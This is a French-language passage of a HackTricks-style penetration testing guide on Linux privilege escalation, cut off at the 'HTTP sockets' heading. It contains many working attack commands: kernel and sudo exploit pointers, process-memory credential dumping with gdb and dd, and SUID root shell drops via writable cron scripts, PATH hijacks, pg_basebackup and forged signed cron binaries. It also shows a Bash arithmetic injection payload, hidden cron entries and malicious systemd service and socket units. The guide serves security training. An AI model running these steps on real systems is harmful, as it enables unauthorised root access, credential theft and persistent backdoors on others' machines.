# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informations système

### Informations OS

Commençons par obtenir des informations sur l'OS en cours d'exécution
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Si vous **avez les autorisations d'écriture sur n'importe quel dossier à l'intérieur de la variable `PATH`**, vous pouvez hijack certaines bibliothèques ou binaires:
```bash
echo $PATH
```
### Infos d'environnement

Des informations intéressantes, des mots de passe ou des clés API dans les variables d'environnement ?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Vérifiez la version du kernel et s'il existe un exploit pouvant être utilisé pour escalate privileges.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Vous pouvez trouver une bonne liste de kernel vulnérables et quelques **compiled exploits** ici: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Other sites where you can find some **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Pour extraire toutes les versions de kernel vulnérables de ce site, vous pouvez faire :
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Outils pouvant aider à rechercher des exploits du kernel sont :

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Recherchez toujours la version du kernel sur Google, il se peut que votre version du kernel soit mentionnée dans un exploit, ce qui confirmera que cet exploit est valide.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Version de sudo

D'après les versions vulnérables de sudo qui apparaissent dans :
```bash
searchsploit sudo
```
Vous pouvez vérifier si la version de sudo est vulnérable en utilisant ce grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Les versions de Sudo antérieures à 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permettent à des utilisateurs locaux non privilégiés d'escalader leurs privilèges vers root via l'option sudo `--chroot` lorsque le fichier `/etc/nsswitch.conf` est utilisé depuis un répertoire contrôlé par l'utilisateur.

Voici un [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) pour exploiter cette [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Avant d'exécuter l'exploit, assurez-vous que votre version de `sudo` est vulnérable et qu'elle prend en charge la fonctionnalité `chroot`.

Pour plus d'informations, consultez l'original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

De @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Consultez **smasher2 box of HTB** pour un **exemple** de la façon dont cette vuln pourrait être exploitée
```bash
dmesg 2>/dev/null | grep "signature"
```
### Plus d'énumération du système
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Énumérer les défenses possibles

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Si vous êtes à l'intérieur d'un container, commencez par la section container-security suivante et pivotez ensuite vers les runtime-specific abuse pages :


{{#ref}}
container-security/
{{#endref}}

## Disques

Vérifiez **ce qui est monté et démonté**, où et pourquoi. Si quelque chose n'est pas monté, vous pouvez essayer de le monter et vérifier la présence d'informations privées.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Logiciels utiles

Énumérer les binaires utiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Vérifiez également si **un compilateur est installé**. Cela peut être utile si vous devez utiliser un kernel exploit, car il est recommandé de le compiler sur la machine où vous allez l'utiliser (ou sur une machine similaire).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Logiciels vulnérables installés

Vérifiez la **version des paquets et services installés**. Il se peut qu'il y ait une ancienne version de Nagios (par exemple) qui pourrait être exploitée pour escalating privileges…\
Il est recommandé de vérifier manuellement la version des logiciels installés les plus suspects.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Si vous avez un accès SSH à la machine, vous pouvez aussi utiliser **openVAS** pour vérifier si les logiciels installés sur la machine sont obsolètes ou vulnérables.

> [!NOTE] > _Notez que ces commandes afficheront beaucoup d'informations majoritairement inutiles ; il est donc recommandé d'utiliser des applications comme OpenVAS ou similaires qui vérifieront si une version de logiciel installée est vulnérable à des exploits connus_

## Processes

Examinez **les processus** en cours d'exécution et vérifiez si un processus possède **plus de privilèges qu'il ne devrait** (par exemple un tomcat exécuté par root ?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** détecte ceux-ci en vérifiant le paramètre `--inspect` dans la ligne de commande du processus.\
Aussi, **vérifiez vos privilèges sur les binaires des processus**, peut-être pouvez-vous écraser l'un d'entre eux.

### Process monitoring

Vous pouvez utiliser des outils comme [**pspy**](https://github.com/DominicBreuker/pspy) pour surveiller les processus. Cela peut être très utile pour identifier des processus vulnérables qui s'exécutent fréquemment ou lorsque qu'un ensemble de conditions est rempli.

### Process memory

Certains services d'un serveur enregistrent des **credentials en clair dans la mémoire**.\
Normalement vous aurez besoin de **root privileges** pour lire la mémoire des processus qui appartiennent à d'autres utilisateurs, donc ceci est généralement plus utile lorsque vous êtes déjà root et que vous voulez découvrir d'autres credentials.\
Cependant, souvenez-vous que **en tant qu'utilisateur normal vous pouvez lire la mémoire des processus qui vous appartiennent**.

> [!WARNING]
> Notez que de nos jours la plupart des machines **n'autorisent pas ptrace par défaut**, ce qui signifie que vous ne pouvez pas extraire d'autres processus appartenant à votre utilisateur non privilégié.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: tous les processus peuvent être débogués, tant qu'ils ont le même uid. C'était le comportement classique de ptrace.
> - **kernel.yama.ptrace_scope = 1**: seul un processus parent peut être débogué.
> - **kernel.yama.ptrace_scope = 2**: seuls les administrateurs peuvent utiliser ptrace, car cela requiert la capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: aucun processus ne peut être tracé avec ptrace. Une fois défini, un redémarrage est nécessaire pour réactiver ptrace.

#### GDB

Si vous avez accès à la mémoire d'un service FTP (par exemple) vous pourriez récupérer le Heap et y rechercher ses credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Pour un identifiant de processus donné, **maps montrent comment la mémoire est mappée dans l'espace d'adresses virtuel de ce processus** ; elles affichent aussi les **permissions de chaque région mappée**. Le pseudo-fichier **mem** **expose la mémoire du processus elle-même**. À partir du fichier **maps** nous savons quelles **régions mémoire sont lisibles** et leurs offsets. Nous utilisons ces informations pour **nous positionner dans le fichier mem et extraire toutes les régions lisibles** dans un fichier.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` donne accès à la mémoire **physique** du système, pas à la mémoire virtuelle. L'espace d'adresses virtuelles du kernel peut être accédé en utilisant /dev/kmem.\
Typiquement, `/dev/mem` n'est lisible que par **root** et le groupe **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump pour Linux

ProcDump est une réinvention pour Linux de l'outil classique ProcDump de la suite Sysinternals pour Windows. Obtenez-le sur [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Outils

Pour dumper la mémoire d'un processus, vous pouvez utiliser :

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Vous pouvez supprimer manuellement les exigences root et dumper le processus qui vous appartient
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root est requis)

### Identifiants depuis la mémoire du processus

#### Exemple manuel

Si vous constatez que le processus authenticator est en cours d'exécution :
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Vous pouvez dump the process (voir les sections précédentes pour trouver différentes façons de dump the memory of a process) et rechercher des credentials dans la memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

L'outil [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) va **voler des identifiants en clair depuis la mémoire** et depuis certains **fichiers bien connus**. Il nécessite des privilèges root pour fonctionner correctement.

| Fonctionnalité                                    | Nom du processus     |
| ------------------------------------------------- | -------------------- |
| Mot de passe GDM (Kali Desktop, Debian Desktop)   | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Connexions FTP actives)                   | vsftpd               |
| Apache2 (Sessions HTTP Basic Auth actives)        | apache2              |
| OpenSSH (Sessions SSH actives - utilisation de sudo) | sshd:                |

#### Expressions régulières de recherche/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tâches planifiées / Cron jobs

### Crontab UI (alseambusher) s'exécutant en tant que root – web-based scheduler privesc

Si un panneau web “Crontab UI” (alseambusher/crontab-ui) s'exécute en tant que root et n'est lié qu'au loopback, vous pouvez quand même y accéder via SSH local port-forwarding et créer un job privilégié pour privesc.

Chaîne typique
- Discover loopback-only port (e.g., 127.0.0.1:8000) and Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- Trouver des identifiants dans des artefacts opérationnels :
- Backups/scripts with `zip -P <password>`
- systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Établir un tunnel et se connecter :
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Créez un job à privilèges élevés et exécutez-le immédiatement (dépose une SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Utilisez-le :
```bash
/tmp/rootshell -p   # root shell
```
Renforcement
- Ne pas exécuter Crontab UI en root ; limiter avec un utilisateur dédié et des permissions minimales
- Lier l'écoute à localhost et restreindre l'accès via pare-feu/VPN ; ne pas réutiliser les mots de passe
- Éviter d'incorporer des secrets dans les unit files ; utiliser des secret stores ou un EnvironmentFile accessible uniquement par root
- Activer l'audit/logging pour les exécutions de jobs à la demande

Vérifiez si une tâche planifiée est vulnérable. Peut‑être pouvez‑vous tirer parti d'un script exécuté par root (wildcard vuln? peut‑on modifier des fichiers que root utilise? utiliser des symlinks? créer des fichiers spécifiques dans le répertoire utilisé par root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Chemin cron

Par exemple, dans _/etc/crontab_ vous pouvez trouver le PATH : _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Remarquez que l'utilisateur "user" a des privilèges d'écriture sur /home/user_)

Si dans ce crontab l'utilisateur root tente d'exécuter une commande ou un script sans définir le path. For example: _\* \* \* \* root overwrite.sh_\
Ensuite, vous pouvez obtenir un shell root en utilisant:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron utilisant un script avec un wildcard (Wildcard Injection)

Si un script exécuté par root contient une “**\***” dans une commande, vous pouvez exploiter cela pour provoquer des comportements inattendus (comme privesc). Exemple:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Si le wildcard est précédé d'un chemin comme** _**/some/path/\***_ **, il n'est pas vulnérable (même** _**./\***_ **ne l'est pas).**

Lisez la page suivante pour plus d'astuces d'exploitation des wildcard :


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash effectue l'expansion des paramètres et la substitution de commande avant l'évaluation arithmétique dans ((...)), $((...)) et let. Si un cron/parser exécuté en root lit des champs de log non fiables et les insère dans un contexte arithmétique, un attaquant peut injecter une substitution de commande $(...) qui s'exécute en root lorsque le cron tourne.

- Pourquoi ça marche : Dans Bash, les expansions se produisent dans cet ordre : expansion des paramètres/variables, substitution de commande, expansion arithmétique, puis découpage des mots et expansion des chemins. Ainsi une valeur comme `$(/bin/bash -c 'id > /tmp/pwn')0` est d'abord substituée (exécutant la commande), puis le `0` numérique restant est utilisé pour l'opération arithmétique, de sorte que le script continue sans erreur.

- Exemple de motif vulnérable typique :
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation : Faire écrire du texte contrôlé par l'attaquant dans le log parsé afin que le champ ressemblant à un nombre contienne une substitution de commande et se termine par un chiffre. Assurez-vous que votre commande n'écrit pas sur stdout (ou redirigez-la) pour que l'arithmétique reste valide.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Si vous **pouvez modifier un cron script** exécuté par root, vous pouvez obtenir un shell très facilement:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si le script exécuté par root utilise un **répertoire auquel vous avez un accès complet**, il peut être utile de supprimer ce dossier et de **créer un symlink vers un autre répertoire** contenant un script que vous contrôlez.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink validation et gestion de fichiers plus sûre

Lors de la revue de scripts/binaries privilégiés qui lisent ou écrivent des fichiers en utilisant des chemins, vérifiez comment les liens sont gérés :

- `stat()` suit un symlink et renvoie les métadonnées de la cible.
- `lstat()` renvoie les métadonnées du lien lui-même.
- `readlink -f` et `namei -l` aident à résoudre la cible finale et à afficher les permissions de chaque composant du chemin.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Pour les defenders/developers, des patterns plus sûrs contre les symlink tricks incluent :

- `O_EXCL` with `O_CREAT`: échouer si le chemin existe déjà (bloque les liens/fichiers pré-créés par un attacker).
- `openat()`: opérer relatif à un descripteur de fichier de répertoire de confiance.
- `mkstemp()`: créer des fichiers temporaires de façon atomique avec des permissions sécurisées.

### Custom-signed cron binaries with writable payloads
Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:

1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary while preserving execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.

### Frequent cron jobs

Vous pouvez monitor les processus pour rechercher des processus exécutés toutes les 1, 2 ou 5 minutes. Peut-être pouvez-vous en tirer parti pour escalader les privilèges.

Par exemple, pour **monitor every 0.1s during 1 minute**, **sort by less executed commands** et supprimer les commandes qui ont été exécutées le plus souvent, vous pouvez faire :
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Vous pouvez aussi utiliser** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (cela surveillera et listera chaque processus qui démarre).

### Sauvegardes root qui préservent les bits de mode définis par l'attaquant (pg_basebackup)

Si un cron appartenant à root exécute `pg_basebackup` (ou toute copie récursive) sur un répertoire de base de données que vous pouvez écrire, vous pouvez placer un binaire **SUID/SGID** qui sera recopié en tant que **root:root** avec les mêmes bits de mode dans la sortie de sauvegarde.

Flux de découverte typique (en tant qu'utilisateur DB à faibles privilèges) :
- Utilisez `pspy` pour repérer un cron root appelant quelque chose comme `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` chaque minute.
- Confirmez que le cluster source (p.ex., `/var/lib/postgresql/14/main`) est accessible en écriture par vous et que la destination (`/opt/backups/current`) devient la propriété de root après la tâche.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Cela fonctionne parce que `pg_basebackup` préserve les bits de mode de fichier lors de la copie du cluster ; lorsqu'il est invoqué par root, les fichiers de destination héritent **la propriété root + SUID/SGID choisis par l'attaquant**. Toute routine de sauvegarde/copie privilégiée similaire qui conserve les permissions et écrit dans un emplacement exécutable est vulnérable.

### Tâches cron invisibles

Il est possible de créer un cronjob **en mettant un retour chariot après un commentaire** (sans caractère de nouvelle ligne), et le cronjob fonctionnera. Exemple (notez le caractère de retour chariot):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Writable _.service_ files

Vérifiez si vous pouvez écrire dans un fichier `.service`, si c'est le cas, vous **pourriez le modifier** afin qu'il **exécute** votre **backdoor lorsque** le service est **démarré**, **redémarré** ou **arrêté** (il se peut que vous deviez attendre le redémarrage de la machine).\
Par exemple créez votre backdoor dans le fichier .service avec **`ExecStart=/tmp/script.sh`**

### Writable service binaries

Gardez à l'esprit que si vous avez des **permissions d'écriture sur des binaires exécutés par des services**, vous pouvez les modifier pour y intégrer des backdoors, de sorte que lorsque les services seront réexécutés, les backdoors s'exécuteront.

### systemd PATH - Relative Paths

Vous pouvez voir le PATH utilisé par **systemd** avec:
```bash
systemctl show-environment
```
Si vous constatez que vous pouvez **écrire** dans l'un des dossiers du chemin vous pouvez être en mesure d'**escalader les privilèges**. Vous devez rechercher les **chemins relatifs utilisés dans les fichiers de configuration des services** tels que :
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Ensuite, créez un **exécutable** portant **le même nom que le binaire du chemin relatif** dans le dossier PATH de systemd auquel vous pouvez écrire, et lorsque le service est sollicité pour exécuter l’action vulnérable (**Démarrer**, **Arrêter**, **Recharger**), votre **backdoor s'exécutera** (les utilisateurs non privilégiés ne peuvent généralement pas démarrer/arrêter les services, mais vérifiez si vous pouvez utiliser `sudo -l`).

**En savoir plus sur les services avec `man systemd.service`.**

## **Timers**

**Timers** sont des fichiers d’unité systemd dont le nom se termine par `**.timer**` qui contrôlent des fichiers ou événements `**.service**`. Les **Timers** peuvent être utilisés comme alternative à cron car ils offrent un support intégré pour les événements de calendrier et les événements monotoniques, et peuvent s’exécuter de manière asynchrone.

Vous pouvez énumérer tous les timers avec:
```bash
systemctl list-timers --all
```
### Timers inscriptibles

Si vous pouvez modifier un timer, vous pouvez le faire exécuter certaines unités existantes de systemd.unit (comme une `.service` ou une `.target`)
```bash
Unit=backdoor.service
```
Dans la documentation, vous pouvez lire ce qu'est Unit:

> L'unité à activer lorsque ce timer expire. L'argument est un nom d'unité, dont le suffixe n'est pas ".timer". Si non spécifié, cette valeur par défaut correspond à un service qui a le même nom que l'unité timer, sauf pour le suffixe. (Voir ci‑dessus.) Il est recommandé que le nom de l'unité activée et le nom de l'unité timer soient identiques, sauf pour le suffixe.

Par conséquent, pour abuser de cette permission, vous devrez :

- Trouver une systemd unit (comme un `.service`) qui **exécute un binaire modifiable en écriture**
- Trouver une systemd unit qui **exécute un chemin relatif** et sur laquelle vous avez **des droits d'écriture** dans le **systemd PATH** (pour usurper cet exécutable)

**En savoir plus sur les timers avec `man systemd.timer`.**

### **Activation du timer**

Pour activer un timer, vous avez besoin de privilèges root et d'exécuter :
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Les Unix Domain Sockets (UDS) permettent la **communication entre processus** sur la même machine ou entre machines dans des modèles client-serveur. Ils utilisent des fichiers descripteurs Unix standard pour la communication inter-ordinateur et sont configurés via des fichiers `.socket`.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Dans ce fichier, plusieurs paramètres intéressants peuvent être configurés :

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ces options diffèrent, mais de manière générale elles servent à **indiquer où il va écouter** le socket (le chemin du fichier de socket AF_UNIX, l'adresse IPv4/IPv6 et/ou le numéro de port à écouter, etc.)
- `Accept`: Prend un argument boolean. Si **true**, une **instance de service est lancée pour chaque connexion entrante** et seul le socket de connexion lui est passé. Si **false**, tous les sockets d'écoute eux-mêmes sont **passés à l'unité de service démarrée**, et une seule unité de service est lancée pour toutes les connexions. Cette valeur est ignorée pour les sockets datagramme et les FIFO où une seule unité de service gère inconditionnellement tout le trafic entrant. **Valeur par défaut : false**. Pour des raisons de performance, il est recommandé d'écrire les nouveaux daemons uniquement d'une manière compatible avec `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Prennent une ou plusieurs lignes de commande, qui sont **exécutées avant** ou **après** que les **sockets**/FIFO d'écoute soient respectivement **créés** et liés. Le premier token de la ligne de commande doit être un nom de fichier absolu, suivi des arguments pour le processus.
- `ExecStopPre`, `ExecStopPost`: Commandes supplémentaires qui sont **exécutées avant** ou **après** que les **sockets**/FIFO d'écoute soient respectivement **fermés** et supprimés.
- `Service`: Spécifie le nom de l'unité **service** à **activer** lors du **trafic entrant**. Ce paramètre n'est autorisé que pour les sockets avec Accept=no. Il prend par défaut le service portant le même nom que le socket (avec le suffixe remplacé). Dans la plupart des cas, il ne devrait pas être nécessaire d'utiliser cette option.

### Fichiers `.socket` modifiables

Si vous trouvez un fichier `.socket` **écrivable**, vous pouvez **ajouter** au début de la section `[Socket]` quelque chose comme : `ExecStartPre=/home/kali/sys/backdoor` et le backdoor sera exécuté avant que le socket ne soit créé. Par conséquent, vous devrez **probablement attendre que la machine soit redémarrée.**\
_Notez que le système doit utiliser cette configuration de fichier socket sinon le backdoor ne sera pas exécuté_

### Socket activation + writable unit path (create missing service)

- une unité socket avec `Accept=no` et `Service=<name>.service`
- l'unité de service référencée est absente
- un attaquant peut écrire dans `/etc/systemd/system` (ou un autre chemin de recherche d'unités)

Dans ce cas, l'attaquant peut créer `<name>.service`, puis déclencher du trafic vers le socket afin que systemd charge et exécute le nouveau service en tant que root.

Flux rapide :
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Sockets en écriture

Si vous **identifiez un socket en écriture** (_ici nous parlons des Unix Sockets et non des fichiers de configuration `.socket`_), alors **vous pouvez communiquer** avec ce socket et peut‑être exploiter une vulnérabilité.

### Énumérer les Unix Sockets
```bash
netstat -a -p --unix
```
### Connexion brute
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exemple d'exploitation :**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

